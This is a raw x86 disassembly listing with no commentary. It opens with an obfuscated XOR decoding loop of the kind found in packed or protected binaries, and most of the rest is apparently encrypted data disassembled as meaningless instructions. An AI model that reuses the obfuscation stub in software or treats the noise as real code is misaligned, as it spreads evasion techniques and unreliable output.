  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x1cfc7d3
  411322:	lock push edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx-0x8]
  41132c:	cs jmp 0x4112bd
  41132f:	retf   0x1926
  411332:	loope  0x41138d
  411334:	mov    ebp,0xf0c4e746
  411339:	xor    al,0xeb
  41133b:	jno    0x411320
  41133d:	mov    BYTE PTR [ebx-0x2d],bl
  411340:	mov    ch,0x9a
  411342:	fs (bad) 
  411344:	mov    eax,ds:0xb2377e82
  411349:	cmp    BYTE PTR [ebx],0xa5
  41134c:	ret    
  41134d:	adc    DWORD PTR [esi],edx
  41134f:	bound  ebp,QWORD PTR [ecx]
  411351:	test   BYTE PTR [eax+0x743524a4],dh
  411357:	pusha  
  411358:	int3   
  411359:	in     al,0xad
  41135b:	push   ds
  41135c:	inc    esi
  41135d:	jo     0x4112ee
  41135f:	dec    ecx
  411360:	pop    ecx
  411361:	adc    al,al
  411363:	in     eax,dx
  411364:	gs push esp
  411366:	imul   ebp,DWORD PTR [ecx],0x234e4754
  41136c:	add    cl,dl
  41136e:	repz jb 0x4113d3
  411371:	scas   eax,DWORD PTR es:[edi]
  411372:	sti    
  411373:	dec    edi
  411374:	cmp    al,0xd9
  411376:	fild   DWORD PTR [eax]
  411378:	push   esp
  411379:	sahf   
  41137a:	call   0x564d874e
  41137f:	fs pop ebp
  411381:	jbe    0x411388
  411383:	daa    
  411384:	mov    ds:0xc507e49f,al
  411389:	lea    ebx,[esi]
  41138b:	sub    ebx,DWORD PTR ds:0xc9dfaf18
  411391:	mov    eax,ds:0xcfb91aad
  411396:	lods   al,BYTE PTR ds:[esi]
  411397:	ds stos DWORD PTR es:[edi],eax
  411399:	ins    DWORD PTR es:[edi],dx
  41139a:	dec    ebx
  41139b:	fidiv  DWORD PTR [ebp-0x2e]
  41139e:	scas   al,BYTE PTR es:[edi]
  41139f:	test   DWORD PTR [edi+0xe],edi
  4113a2:	push   0x5e273c5c
  4113a7:	shr    esi,1
  4113a9:	jns    0x4113c2
  4113ab:	and    esp,DWORD PTR [ecx-0x2b]
  4113ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113af:	out    dx,al
  4113b0:	and    ebp,DWORD PTR ds:0x146e234f
  4113b6:	jl     0x411358
  4113b8:	cmp    BYTE PTR [edi],0x3d
  4113bb:	imul   ebp,DWORD PTR [eax],0xffffff8f
  4113be:	pusha  
  4113bf:	mov    esp,0x533577fd
  4113c4:	sbb    edi,edi
  4113c6:	lea    esp,[ebx]
  4113c8:	ja     0x411351
  4113ca:	call   0xefa10bd8
  4113cf:	ds ds mov esi,0xc9a55888
  4113d6:	mov    ds:0x603b9de3,al
  4113db:	cli    
  4113dc:	jno    0x411379
  4113de:	and    BYTE PTR [ebx],ah
  4113e0:	inc    edx
  4113e1:	cmp    ebp,0x882f7f94
  4113e7:	inc    esi
  4113e8:	shld   DWORD PTR [ebp-0x205a7d08],ebx,0xf
  4113f0:	mov    dh,0xe1
  4113f2:	ja     0x4113db
  4113f4:	jecxz  0x411378
  4113f6:	xchg   ecx,eax
  4113f7:	pop    edx
  4113f8:	xor    DWORD PTR ss:[eax+0x4],0xffffffef
  4113fd:	dec    edi
  4113fe:	scas   eax,DWORD PTR es:[edi]
  4113ff:	xor    dl,bl
  411401:	cld    
  411402:	xchg   BYTE PTR [edi-0x54],bl
  411405:	pop    ebp
  411406:	std    
  411407:	pop    ds
  411408:	sub    al,0xa6
  41140a:	cs cdq 
  41140c:	jbe    0x411411
  41140e:	cmp    edi,DWORD PTR [edi]
  411410:	cwde   
  411411:	dec    eax
  411412:	sub    cl,BYTE PTR [ebp+0xdabceff]
  411418:	idiv   BYTE PTR [edi-0x58]
  41141b:	and    BYTE PTR [edx+0x57b0cb07],al
  411421:	repnz sub al,0xc1
  411424:	mov    ds:0xee5a0493,al
  411429:	or     ecx,DWORD PTR [ebx]
  41142b:	adc    DWORD PTR [edx],edi
  41142d:	stc    
  41142e:	lods   eax,DWORD PTR ds:[esi]
  41142f:	pop    ds
  411430:	xchg   al,al
  411432:	jno    0x41147f
  411434:	ins    DWORD PTR es:[edi],dx
  411435:	loope  0x411451
  411437:	mov    ds:0x1fcc64bb,al
  41143c:	das    
  41143d:	add    al,0xf1
  41143f:	leave  
  411440:	mov    WORD PTR [eax-0x12edd3c],?
  411446:	mov    esp,0x7089564
  41144b:	or     al,ah
  41144d:	std    
  41144e:	aad    0x9
  411450:	push   es
  411451:	adc    esp,DWORD PTR [edx-0x53]
  411454:	jbe    0x4114b9
  411456:	and    al,0xbb
  411458:	adc    bl,BYTE PTR ds:0x5fd9c931
  41145e:	leave  
  41145f:	or     ebx,DWORD PTR [ebx-0x8]
  411462:	mov    ah,0x9d
  411464:	jl     0x4114aa
  411466:	add    BYTE PTR [ebx],ch
  411468:	sbb    eax,0x2cbddd2a
  41146d:	mov    bh,0xe4
  41146f:	mov    edi,0x87c529b2
  411474:	dec    ecx
  411475:	aad    0xeb
  411477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411479:	in     al,dx
  41147a:	jmp    0x4114ce
  41147c:	pusha  
  41147d:	dec    esp
  41147e:	stos   DWORD PTR es:[edi],eax
  41147f:	dec    edi
  411480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411481:	push   esi
  411482:	mov    ebp,0xcda46f5e
  411487:	fmulp  st(6),st
  411489:	test   DWORD PTR [edi+edi*8-0x5a],esp
  41148d:	lea    esp,[esi-0x65a8e2d5]
  411493:	add    bl,BYTE PTR [eax+eax*4]
  411496:	mov    al,0x56
  411498:	add    cl,BYTE PTR ds:0xb713578c
  41149e:	mov    esi,0x1db01c46
  4114a3:	std    
  4114a4:	pop    eax
  4114a5:	mov    edi,0xd565ed71
  4114aa:	retf   0x7558
  4114ad:	ss dec eax
  4114af:	lods   eax,DWORD PTR ds:[esi]
  4114b0:	sbb    WORD PTR [edx-0x46],si
  4114b4:	push   ds
  4114b5:	inc    ecx
  4114b6:	call   0xeea105b7
  4114bb:	enter  0xdb64,0xe7
  4114bf:	rol    BYTE PTR [esi+0x77],0x44
  4114c3:	sub    ah,al
  4114c5:	ja     0x411454
  4114c7:	outs   dx,DWORD PTR ds:[esi]
  4114c8:	jb     0x4114d1
  4114ca:	xchg   edi,eax
  4114cb:	ror    DWORD PTR gs:[ecx-0x5550a301],cl
  4114d2:	pop    es
  4114d3:	popa   
  4114d4:	mov    cl,0xdf
  4114d6:	xor    dh,BYTE PTR [edx+0x5a81f563]
  4114dc:	ret    0xa436
  4114df:	and    edx,DWORD PTR [esi-0x2ac1df31]
  4114e5:	in     eax,dx
  4114e6:	lock inc ch
  4114e9:	(bad)  
  4114ea:	fld    QWORD PTR [eax-0x7e]
  4114ed:	dec    ecx
  4114ee:	out    dx,al
  4114ef:	inc    ecx
  4114f0:	and    BYTE PTR [esi+0x57b39533],0xa1
  4114f7:	mov    BYTE PTR [edi],0x42
  4114fa:	rcr    BYTE PTR [ebx-0x61],1
  4114fd:	pushf  
  4114fe:	xchg   edx,eax
  4114ff:	jbe    0x411540
  411501:	cmp    eax,0x320ebd2e
  411506:	jecxz  0x4114f7
  411508:	adc    eax,esi
  41150a:	sub    al,0x7b
  41150c:	cld    
  41150d:	out    0xb,eax
  41150f:	rcl    DWORD PTR [edx],1
  411511:	inc    esi
  411512:	fwait
  411513:	sar    dl,0xab
  411516:	popf   
  411517:	add    al,BYTE PTR [edx]
  411519:	mov    eax,0x489fb567
  41151e:	xor    DWORD PTR [edx+ecx*1-0x10c6a715],esp
  411525:	js     0x41159f
  411527:	not    BYTE PTR ds:0x1051c489
  41152d:	mov    ah,0xa7
  41152f:	jge    0x4114b9
  411531:	adc    DWORD PTR [edi+0x17],esi
  411534:	pusha  
  411535:	xchg   ecx,eax
  411536:	bound  ebx,QWORD PTR [edi]
  411538:	push   esi
  411539:	into   
  41153a:	dec    ebx
  41153b:	fnstcw WORD PTR [ebx+0x68583648]
  411541:	xlat   BYTE PTR ds:[ebx]
  411542:	jp     0x411518
  411544:	daa    
  411545:	dec    esp
  411546:	push   es
  411547:	outs   dx,BYTE PTR ds:[esi]
  411548:	pop    ss
  411549:	sbb    esi,edi
  41154b:	jecxz  0x411547
  41154d:	xlat   BYTE PTR ds:[ebx]
  41154e:	nop
  41154f:	stc    
  411550:	in     al,dx
  411551:	jmp    0x6a43:0xbd26f444
  411558:	pop    es
  411559:	pop    ebx
  41155a:	adc    DWORD PTR [ebp+0x162eb399],ebx
  411560:	dec    esp
  411561:	cmp    BYTE PTR [esi-0x5e05128e],bl
  411567:	scas   eax,DWORD PTR es:[edi]
  411568:	sub    DWORD PTR [eax+0xa907ef3],0x4808bf85
  411572:	xchg   esp,eax
  411573:	ss loope 0x41154f
  411576:	and    dh,0xfe
  411579:	sub    ebp,edx
  41157b:	jne    0x41153d
  41157d:	(bad)  
  41157e:	pop    esp
  41157f:	add    esi,esp
  411581:	push   ss
  411582:	test   al,0xe5
  411584:	or     al,0xa8
  411586:	mov    esi,0x34987e85
  41158b:	rol    BYTE PTR [ecx-0x29],0x5d
  41158f:	cld    
  411590:	or     ecx,DWORD PTR ds:0xe38600ca
  411596:	sahf   
  411597:	push   es
  411598:	cmp    BYTE PTR [ebp+0x57],0x85
  41159c:	pop    eax
  41159d:	adc    DWORD PTR [edi],esp
  41159f:	xchg   edi,eax
  4115a0:	sub    eax,0xc0b3015d
  4115a5:	rcr    DWORD PTR ds:0xbbc60ae8,cl
  4115ab:	or     al,0x74
  4115ad:	addr16 dec eax
  4115af:	gs in  eax,0x23
  4115b2:	mov    ch,0xd1
  4115b4:	jmp    0x411615
  4115b6:	sti    
  4115b7:	cmp    bl,bh
  4115b9:	loopne 0x41156d
  4115bb:	xchg   ebp,eax
  4115bc:	(bad)  
  4115bd:	sbb    al,BYTE PTR [eax+0x180d1a7d]
  4115c3:	or     esp,DWORD PTR [eax]
  4115c5:	inc    edx
  4115c6:	cmp    bl,BYTE PTR [ebx]
  4115c8:	(bad)  
  4115c9:	push   edx
  4115ca:	test   DWORD PTR [ebp+0x36],esi
  4115cd:	adc    edi,DWORD PTR [edi-0x62]
  4115d0:	mov    al,0xc1
  4115d2:	xor    DWORD PTR [ecx+esi*2+0x61d48113],esp
  4115d9:	std    
  4115da:	rol    BYTE PTR [ebx-0x5b],0xf3
  4115de:	inc    ecx
  4115df:	mov    esi,0xf631ed51
  4115e4:	fneni(8087 only) 
  4115e6:	pop    ds
  4115e7:	repz jns 0x411643
  4115ea:	popa   
  4115eb:	dec    edi
  4115ec:	(bad)  
  4115ed:	out    dx,al
  4115ee:	arpl   WORD PTR [eax],si
  4115f0:	sbb    al,0xfa
  4115f2:	shr    BYTE PTR [esi+0x3f43f6a4],0xec
  4115f9:	xchg   esi,eax
  4115fa:	arpl   WORD PTR [ebp-0x5d27d253],bp
  411600:	sbb    al,0x35
  411602:	jo     0x41160b
  411604:	es loope 0x4115cc
  411607:	pop    ecx
  411608:	sub    BYTE PTR [ecx-0x75fa72cc],dl
  41160e:	xor    al,0xe6
  411610:	cdq    
  411611:	cmp    al,0x49
  411613:	cmp    BYTE PTR ds:0x7b1f3c65,bh
  411619:	adc    dl,bl
  41161b:	out    0xd7,eax
  41161d:	aad    0x40
  41161f:	mov    DWORD PTR [esi+0x2e],0x9ea7eefd
  411626:	stc    
  411627:	xchg   ebp,eax
  411628:	or     bh,dh
  41162a:	cmp    BYTE PTR [ebp-0x3dbb01d7],ch
  411630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411631:	mov    ds:0x667fbb0f,al
  411636:	add    ecx,ebx
  411638:	ret    
  411639:	pop    eax
  41163a:	fwait
  41163b:	mov    dh,0xe0
  41163d:	mov    bh,dh
  41163f:	mov    ds:0x9026dab3,eax
  411644:	jmp    0x89a9:0x6fea03d
  41164b:	or     eax,0x916e4737
  411650:	push   esp
  411651:	add    esp,DWORD PTR [ebx+eax*8]
  411654:	dec    ebp
  411655:	dec    ebp
  411656:	fcomi  st,st(0)
  411658:	test   al,0x9b
  41165a:	stc    
  41165b:	outs   dx,DWORD PTR ds:[esi]
  41165c:	dec    eax
  41165d:	push   ebx
  41165e:	mov    dl,0xea
  411660:	mov    al,ds:0x51a3c3b8
  411665:	push   ecx
  411666:	add    al,BYTE PTR [ebp+0x8ecf760]
  41166c:	div    bh
  41166e:	jbe    0x4116a8
  411670:	inc    esi
  411671:	nop
  411672:	lods   al,BYTE PTR ds:[esi]
  411673:	push   eax
  411674:	mov    ah,0xa7
  411676:	bound  edx,QWORD PTR [ebp+0x201da518]
  41167c:	push   ebx
  41167d:	mov    ebx,0xdb6c7292
  411682:	out    0xa3,al
  411684:	ss loop 0x411690
  411687:	test   eax,0x5df5cd5e
  41168c:	adc    al,0xbc
  41168e:	scas   al,BYTE PTR es:[edi]
  41168f:	into   
  411690:	xchg   DWORD PTR [eax+edx*8],eax
  411693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411694:	jmp    0x66e8024b
  411699:	jo     0x41168e
  41169b:	scas   eax,DWORD PTR es:[edi]
  41169c:	and    BYTE PTR [ecx+0x22],bl
  41169f:	push   edi
  4116a0:	xchg   ebp,eax
  4116a1:	clc    
  4116a2:	outs   dx,BYTE PTR ds:[esi]
  4116a3:	in     al,dx
  4116a4:	xchg   ebp,eax
  4116a5:	mov    ah,0x9
  4116a7:	lods   al,BYTE PTR ds:[esi]
  4116a8:	out    dx,al
  4116a9:	and    eax,0x3b103efd
  4116ae:	out    0x20,al
  4116b0:	mov    ds:0xb6aa82a5,al
  4116b5:	call   0x99c2:0xaf242b51
  4116bc:	retf   0x39d9
  4116bf:	jne    0x4116f9
  4116c1:	je     0x41170e
  4116c3:	cmp    al,0x21
  4116c5:	lahf   
  4116c6:	inc    edx
  4116c7:	dec    ebx
  4116c8:	and    al,0x7a
  4116ca:	and    esp,ebx
  4116cc:	jnp    0x4116b0
  4116ce:	mov    al,0xd4
  4116d0:	test   DWORD PTR [edi+ebp*2+0x50a42743],esi
  4116d7:	add    DWORD PTR [ebp+0xa],eax
  4116da:	and    DWORD PTR [ebp-0x53],0xe605f4aa
  4116e1:	aaa    
  4116e2:	xor    bh,ch
  4116e4:	js     0x411734
  4116e6:	pop    esp
  4116e7:	mov    ds:0x4d90cee7,al
  4116ec:	xchg   edi,eax
  4116ed:	imul   edi,DWORD PTR [eax+esi*2],0x6abbe632
  4116f4:	enter  0x6d5,0x52
  4116f8:	fsubr  DWORD PTR [ebx]
  4116fa:	aaa    
  4116fb:	or     BYTE PTR [ebp-0x27],bl
  4116fe:	xor    DWORD PTR [eax+0x18],0xffffffd4
  411702:	xchg   esi,eax
  411703:	clc    
  411704:	arpl   ax,ax
  411706:	in     al,dx
  411707:	ja     0x4116c9
  411709:	in     eax,dx
  41170a:	sub    BYTE PTR [eax-0x793b61f6],0xda
  411711:	mov    ch,al
  411713:	sub    al,0xa9
  411715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411716:	mov    al,ds:0x595a1d9b
  41171b:	xchg   ah,dh
  41171d:	inc    eax
  41171e:	lods   eax,DWORD PTR ds:[esi]
  41171f:	clc    
  411720:	xchg   BYTE PTR ds:0x275f522b,dl
  411726:	jne    0x411765
  411728:	push   ebx
  411729:	adc    al,BYTE PTR [edx+0x44]
  41172c:	adc    ch,cl
  41172e:	mov    ds:0xe8ac6e9e,eax
  411733:	sub    eax,edi
  411735:	adc    al,0xcd
  411737:	jno    0x411700
  411739:	mov    BYTE PTR [esi+eiz*8],bl
  41173c:	in     eax,0xf4
  41173e:	daa    
  41173f:	push   eax
  411740:	in     eax,dx
  411741:	jne    0x4117c0
  411743:	loopne 0x41175b
  411745:	daa    
  411746:	mov    cl,cl
  411748:	push   ecx
  411749:	(bad)  
  41174a:	jge    0x41179e
  41174c:	(bad)  
  41174e:	outs   dx,BYTE PTR ds:[esi]
  41174f:	mov    bh,0x4a
  411751:	sub    dh,ch
  411753:	mov    bh,0xb0
  411755:	mov    DWORD PTR [ebx-0x7d],edi
  411758:	add    dh,BYTE PTR [edx+ecx*2+0x55943276]
  41175f:	repnz add eax,0x6ef78296
  411765:	ins    BYTE PTR es:[edi],dx
  411766:	cmp    dl,dh
  411768:	mul    DWORD PTR [eax+esi*1]
  41176b:	ss mov esp,0x6a9b52fd
  411771:	test   eax,0x1e095d5c
  411776:	(bad)  
  411777:	mov    esp,0xb2b510b9
  41177c:	or     DWORD PTR [ecx],ebx
  41177e:	inc    ebp
  41177f:	jge    0x4117b1
  411781:	jmp    0x4117d2
  411783:	mov    esp,0x91009065
  411788:	xchg   BYTE PTR [ebp+0x3602d5cb],ch
  41178e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41178f:	push   ss
  411790:	jb     0x41180d
  411792:	pop    ebx
  411793:	shl    BYTE PTR [edx+0x5590914a],1
  411799:	mov    BYTE PTR [edi+eiz*4],0xe1
  41179d:	or     DWORD PTR [edi],eax
  41179f:	or     ebp,DWORD PTR [eax-0xe]
  4117a2:	lahf   
  4117a3:	cmp    BYTE PTR [edi],0xdc
  4117a6:	push   es
  4117a7:	xor    cl,dl
  4117a9:	inc    ecx
  4117aa:	scas   al,BYTE PTR es:[edi]
  4117ab:	into   
  4117ac:	test   al,0x32
  4117ae:	or     cl,al
  4117b0:	in     eax,dx
  4117b1:	loop   0x411794
  4117b3:	stc    
  4117b4:	pop    esp
  4117b5:	push   ebx
  4117b6:	sbb    esp,DWORD PTR [ecx-0x6ca0b35a]
  4117bc:	bound  ebp,QWORD PTR [ebp+edi*1+0x74]
  4117c0:	pop    ebp
  4117c1:	pop    ebx
  4117c2:	jmp    0x1e1b38cb
  4117c7:	mov    ds:0x306f03dd,eax
  4117cc:	jno    0x4117ff
  4117ce:	ret    0x71a
  4117d1:	inc    edx
  4117d2:	call   0x9cff:0xbf3b80a0
  4117d9:	pop    edx
  4117da:	fistp  DWORD PTR [esi-0x7e]
  4117dd:	fcomp  QWORD PTR [eax+0x45]
  4117e0:	xchg   BYTE PTR [edi+0x2c],bl
  4117e3:	out    0x28,al
  4117e5:	add    dh,cl
  4117e7:	mov    BYTE PTR [esi-0x27],ah
  4117ea:	sub    eax,0x37ad0ef3
  4117ef:	mov    ecx,0xf6088ba5
  4117f4:	pop    esi
  4117f5:	fsub   DWORD PTR [edx]
  4117f7:	push   ds
  4117f8:	add    DWORD PTR [ebx+ebp*2],ecx
  4117fb:	add    DWORD PTR ds:0xea6ebb50,0xa67cac6
  411805:	dec    esi
  411806:	mov    ecx,?
  411808:	in     al,dx
  411809:	imul   edi,DWORD PTR [edx+0x2e],0xe228b4ec
  411810:	pop    edx
  411811:	mov    bh,al
  411813:	sub    al,0xe7
  411815:	push   ebp
  411816:	sub    DWORD PTR [edx],0xffffff9d
  411819:	sub    ecx,DWORD PTR [esp+edx*4+0x37236fe3]
  411820:	push   eax
  411821:	lods   al,BYTE PTR ds:[esi]
  411822:	push   edi
  411823:	jmp    0x411814
  411825:	and    BYTE PTR ds:0xc88fa57e,al
  41182b:	jmp    0x4117e8
  41182d:	sub    eax,0xb8e46d7a
  411832:	xchg   edx,eax
  411833:	adc    eax,0x6058e4f9
  411838:	adc    eax,0xefb3283a
  41183d:	inc    DWORD PTR [edx+0x4a210210]
  411843:	sub    ah,BYTE PTR cs:[ebx+0x16]
  411847:	jmp    0x41187e
  411849:	push   ecx
  41184a:	xor    esp,DWORD PTR [ebp-0x33]
  41184d:	pop    ss
  41184e:	std    
  41184f:	adc    ch,BYTE PTR [ecx-0x20]
  411852:	loop   0x411836
  411854:	in     al,dx
  411855:	adc    BYTE PTR [eax-0x43dc0709],dl
  41185b:	mov    esp,0xddf55872
  411860:	add    DWORD PTR [ecx-0x24003c6b],eax
  411866:	mov    esi,esi
  411868:	adc    bl,al
  41186a:	sbb    BYTE PTR ds:[esi+edx*4-0x7ba76aaf],bh
  411872:	pop    ebp
  411873:	aas    
  411874:	mov    dh,0x94
  411876:	mov    ecx,0xc8b671e1
  41187b:	shr    BYTE PTR [ebx-0x4768e98b],cl
  411881:	cmc    
  411882:	stos   DWORD PTR es:[edi],eax
  411883:	mov    cl,0x67
  411885:	iret   
  411886:	test   al,0x8d
  411888:	jne    0x41186d
  41188a:	pop    ebx
  41188b:	sti    
  41188c:	pop    ecx
  41188d:	cmc    
  41188e:	js     0x411889
  411890:	xor    DWORD PTR [ebp+ebx*1-0x1f3eec0b],ebp
  411897:	xchg   ecx,eax
  411898:	cmovs  ebp,DWORD PTR [ebp+0x24c47108]
  41189f:	mov    al,ds:0xf4094daa
  4118a4:	xlat   BYTE PTR ds:[ebx]
  4118a5:	mov    cl,0x54
  4118a7:	repnz les ebx,FWORD PTR [eax-0x6c]
  4118ab:	loop   0x4118e7
  4118ad:	cli    
  4118ae:	and    eax,0x3222fda8
  4118b3:	cli    
  4118b4:	fnstenv [edx]
  4118b6:	aas    
  4118b7:	push   es
  4118b8:	inc    eax
  4118b9:	test   DWORD PTR [eax-0x6dc812cd],0x1fbbdae2
  4118c3:	shr    BYTE PTR [esi-0x31],cl
  4118c6:	mov    ah,0xce
  4118c8:	sbb    al,0x40
  4118ca:	imul   ebp,DWORD PTR [edi+0x17],0xffffffe1
  4118ce:	test   ecx,esp
  4118d0:	imul   esp,DWORD PTR [ecx],0x1e
  4118d3:	arpl   WORD PTR [edi+0x44fb3ebc],ax
  4118d9:	aad    0x8
  4118db:	fcmovbe st,st(0)
  4118dd:	mov    al,ds:0x93896dc8
  4118e2:	add    dh,BYTE PTR [ecx-0x4b]
  4118e5:	enter  0xe99a,0x30
  4118e9:	hlt    
  4118ea:	scas   eax,DWORD PTR es:[edi]
  4118eb:	jmp    0xf6d5:0xcd46ea5e
  4118f2:	neg    DWORD PTR [esi+0x377df36c]
  4118f8:	loope  0x411912
  4118fa:	div    BYTE PTR [ebp+ecx*2+0x15]
  4118fe:	in     eax,0x69
  411900:	shl    BYTE PTR [esi],1
  411902:	xchg   ebp,eax
  411903:	push   ebp
  411904:	retf   0x84df
  411907:	jl     0x4118ba
  411909:	jae    0x41189c
  41190b:	ss cmp dl,0xb8
  41190f:	call   0x1d04:0x3332e238
  411916:	or     ecx,esi
  411918:	mov    ds:0x6d51bc2e,al
  41191d:	bound  ebx,QWORD PTR [esi+0x37]
  411920:	addr16 push cs
  411922:	inc    esi
  411923:	stos   DWORD PTR es:[edi],eax
  411924:	int    0x47
  411926:	in     al,dx
  411927:	adc    al,BYTE PTR [ebp-0x21]
  41192a:	jae    0x4118dc
  41192c:	adc    eax,0x288518d0
  411931:	mov    ds:0xeef35969,al
  411936:	aas    
  411937:	adc    ebx,ebx
  411939:	jne    0x411979
  41193b:	mov    BYTE PTR [ebp-0xe],ah
  41193e:	sti    
  41193f:	aaa    
  411940:	cs dec ebp
  411942:	int3   
  411943:	outs   dx,BYTE PTR ds:[esi]
  411944:	mov    ah,0xe9
  411946:	repz sbb al,0x4f
  411949:	loop   0x411960
  41194b:	cli    
  41194c:	(bad)  
  41194d:	xlat   BYTE PTR ds:[ebx]
  41194e:	in     eax,dx
  41194f:	adc    eax,0x65c269ac
  411954:	mov    ds:0x9d0a2bd7,al
  411959:	xor    cl,BYTE PTR [eax-0x34]
  41195c:	jecxz  0x4119ce
  41195e:	aas    
  41195f:	and    edi,DWORD PTR [esi+ecx*4+0xb25cec]
  411966:	loop   0x4119cf
  411968:	jg     0x41193b
  41196a:	test   BYTE PTR [esi+0x79],dh
  41196d:	sub    al,dh
  41196f:	dec    eax
  411970:	mov    al,ds:0xec7a349e
  411975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411976:	lods   eax,DWORD PTR ds:[esi]
  411977:	or     BYTE PTR [eax+ecx*2-0x53],ah
  41197b:	cmp    dl,0xb
  41197e:	add    al,0x63
  411980:	cmp    esp,DWORD PTR [esi]
  411982:	repz cmp eax,0x8b732472
  411988:	xor    ch,bl
  41198a:	and    al,BYTE PTR [edi-0x44]
  41198d:	inc    ecx
  41198e:	push   ebp
  41198f:	sbb    eax,0x902266ab
  411994:	addr16 daa 
  411996:	xor    BYTE PTR [ebx],dl
  411998:	rol    eax,1
  41199a:	(bad)  
  41199b:	sbb    bl,BYTE PTR [edx+esi*1-0x5b]
  41199f:	xor    bl,BYTE PTR [ebx]
  4119a1:	fisttp QWORD PTR [esi]
  4119a3:	jo     0x411a20
  4119a5:	stos   DWORD PTR es:[edi],eax
  4119a6:	mov    ch,0x78
  4119a8:	repnz mov BYTE PTR [edi],al
  4119ab:	sahf   
  4119ac:	mov    edx,0xc54522e1
  4119b1:	jle    0x4119cf
  4119b3:	and    DWORD PTR ds:0xa76f8729,0xffffffec
  4119ba:	int    0x64
  4119bc:	jg     0x411964
  4119be:	jmp    0x411a27
  4119c0:	xor    eax,0x5f854024
  4119c5:	add    eax,0x71afba06
  4119ca:	cmp    DWORD PTR [edi-0x11582981],esp
  4119d0:	in     al,0xa
  4119d2:	dec    esp
  4119d3:	lds    ebp,FWORD PTR [edx-0x22]
  4119d6:	adc    al,0xcb
  4119d8:	sub    ah,BYTE PTR [edx]
  4119da:	adc    DWORD PTR es:[edi],ebx
  4119dd:	(bad)  
  4119de:	pop    ebp
  4119df:	in     al,dx
  4119e0:	jo     0x411a08
  4119e2:	mov    al,0xa3
  4119e4:	cmp    al,0x91
  4119e6:	clc    
  4119e7:	into   
  4119e8:	push   cs
  4119e9:	lds    esi,FWORD PTR [edi+eiz*4+0x48419cc7]
  4119f0:	iret   
  4119f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119f2:	push   cs
  4119f3:	add    cl,BYTE PTR [ecx-0x3df08e6]
  4119f9:	mov    cl,0xf2
  4119fb:	adc    al,0xe4
  4119fd:	sub    eax,0x21bbc07e
  411a02:	push   es
  411a03:	mov    edi,DWORD PTR [eax+0x41]
  411a06:	sbb    esi,esi
  411a08:	iret   
  411a09:	shl    ch,1
  411a0b:	push   edi
  411a0c:	fwait
  411a0d:	xchg   ebp,eax
  411a0e:	push   esi
  411a0f:	or     esp,DWORD PTR ds:0xf80a4120
  411a15:	mov    ebx,DWORD PTR [esi-0x2c5b2f26]
  411a1b:	jmp    0x4119c9
  411a1d:	inc    eax
  411a1e:	add    dh,BYTE PTR [esi+0x568773b9]
